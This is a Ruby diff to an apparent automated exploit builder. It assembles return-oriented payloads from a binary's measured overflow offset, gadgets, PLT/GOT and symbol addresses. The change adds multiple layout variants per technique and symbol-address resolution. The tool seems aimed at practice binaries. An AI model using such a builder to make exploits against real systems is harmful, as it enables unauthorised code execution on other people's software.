@@ -25,7 +25,7 @@ module Lictor
     # technique WINS over the built-in file (packs teach, the builder
     # follows).
     # Returns {path:, offset:, offset_source:, sink:, ret:, ret_source:,
-    # arch:, size:}.
+    # variant:, arch:, size:}.
     def build(binary:, facts:, technique:, out:, payload_file: nil, packs: nil, shellcode_path: nil)
       require "augure-profiler" # lazy: metasm loads on the first build only
       facts = Augure::Facts.parse(facts) if facts.is_a?(String)
@@ -53,22 +53,48 @@ module Lictor
           "no measured offset - static analysis found no controlled return and the debugger did not either"
       end
 
-      layout = layout_for(technique, packs)
+      layouts = layouts_for(technique, packs)
       arch = AugureProfiler.arch(binary)
       width = (arch == :x64) ? "Q<" : "L<"
-      body, ret, ret_source = assemble(facts, layout, offset, arch, width, payload_file, shellcode_path)
+      body = ret = ret_source = variant = nil
+      failures = []
+      layouts.each do |(name, layout)|
+        body, ret, ret_source = assemble(facts, layout, offset, arch, width, payload_file, shellcode_path)
+        variant = name
+        break
+      rescue BuildError => e
+        failures << [name, e.message]
+      end
+      raise BuildError, match_failure(technique, failures) if body.nil?
+
       File.binwrite(out, body)
       {path: out, offset: offset, offset_source: offset_source, sink: static&.dig(:sink),
-       ret: ret, ret_source: ret_source, arch: arch, size: body.bytesize}
+       ret: ret, ret_source: ret_source, variant: variant, arch: arch, size: body.bytesize}
     end
 
-    # lictor's data file first; a pack teaching the same technique with
-    # a build: section overrides (packs teach, the builder follows).
-    def layout_for(technique, packs = [])
+    # A technique may ship SEVERAL layouts: the mr5 callme form (PLT
+    # helpers) and the static twin's form (announced-nothing stage
+    # functions) are the same capability, and the facts decide which one
+    # the binary supports. Each candidate carries its name for the trail.
+    def layouts_for(technique, packs = [])
       built_in = YAML.load_file(File.expand_path("../config/build_layouts.yml", __dir__))
-      Array(packs).filter_map(&:build).find { |b| b["technique"] == technique }&.dig("layout") ||
-        built_in.dig(technique, "layout") or
-        raise BuildError, "no build layout for #{technique} - teach one in the pack or in build_layouts.yml"
+      entry = Array(packs).filter_map(&:build).find { |b| b["technique"] == technique } ||
+        built_in[technique]
+      raise BuildError, "no build layout for #{technique} - teach one in the pack or in build_layouts.yml" unless entry
+
+      variants = entry["variants"]
+      return variants.map { |v| [v["name"], v["layout"]] } if variants
+
+      [["default", entry["layout"]]]
+    end
+
+    # Every candidate failed: name each one with its own reason, never a
+    # single opaque message (the operator teaches the missing layout).
+    def match_failure(technique, failures)
+      return "no build layout for #{technique} - teach one in the pack or in build_layouts.yml" if failures.empty?
+
+      details = failures.map { |(name, why)| "#{name}: #{why}" }.join("; ")
+      "no build variant of #{technique} matches the facts (#{details})"
     end
 
     # The layout slots, resolved against the facts and the measurement.
@@ -168,9 +194,18 @@ module Lictor
         [entry[1], "got_addr:#{name}@#{entry[1]}"]
       when /\Aconst:(\d+)\z/
         [Regexp.last_match(1).to_i, "const:#{Regexp.last_match(1)}"]
+      when /\Asym:(.+)\z/
+        name = Regexp.last_match(1)
+        entry = facts["sym_addr"]&.find { |n, _| n == name }
+        unless entry
+          raise BuildError,
+            "no sym_addr(\"#{name}\") fact - the symbol is not in the binary's table, profile it first"
+        end
+
+        [entry[1], "sym_addr:#{name}@#{entry[1]}"]
       else
         raise BuildError,
-          "unknown address reference #{ref.inspect} (win | gadget:TYPE | plt_addr:NAME | got_addr:NAME | leak:NAME | const:N)"
+          "unknown address reference #{ref.inspect} (win | gadget:TYPE | plt_addr:NAME | got_addr:NAME | leak:NAME | sym:NAME | const:N)"
       end
     end
 
